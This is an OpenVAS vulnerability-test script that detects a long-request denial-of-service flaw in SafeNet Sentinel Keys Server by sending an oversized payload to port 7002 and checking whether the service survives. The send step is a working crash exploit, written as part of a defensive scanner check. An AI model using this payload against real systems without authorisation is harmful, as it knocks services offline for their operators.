###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_safenet_spi_sk_server_long_req_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# SafeNet Sentinel Protection Installer Long Request DoS Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802460");
  script_version("$Revision: 11374 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-09-25 09:53:12 +0530 (Tue, 25 Sep 2012)");
  script_name("SafeNet Sentinel Protection Installer Long Request DoS Vulnerability");

  script_xref(name:"URL", value:"http://1337day.com/exploits/19455");
  script_xref(name:"URL", value:"http://secunia.com/advisories/50685/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/21508/");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/50685");
  script_xref(name:"URL", value:"http://bot24.blogspot.in/2012/09/safenet-sentinel-keys-server-dos.html");

  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 7002);
  script_mandatory_keys("SentinelKeysServer/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause the
  application to crash, creating a denial-of-service condition.");
  script_tag(name:"affected", value:"Sentinel Protection Installer version 7.6.5 (sntlkeyssrvr.exe v1.3.1.3)");
  script_tag(name:"insight", value:"The flaw is due to a boundary error in Sentinel Keys Server within
  the 'sntlkeyssrvr.exe' when handling long requests, can be exploited to cause a
  stack-based buffer overflow via an overly-long request.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running Sentinel Protection Installer and is prone
  to denial of service vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:7002);

banner = get_http_banner(port: port);
if(!banner || "Server: SentinelKeysServer" >!< banner){
  exit(0);
}

## Create a socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Crap the long data and send
data = string("#1",crap(4093));
send(socket:soc, data: data);
close(soc);

soc = open_sock_tcp(port);
if(soc)
{
  ## some time if server got crashed , It will respond to new sockets.
  ## so server crash confirmation is required from response page here.
  req = http_get(item:"/", port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if(!res || "<title>Sentinel License Monitor</title>" >!< res)
  {
    close(soc);
    security_message(port:port);
    exit(0);
  }
}
else {
  security_message(port:port);
  exit(0);
}

exit(99);
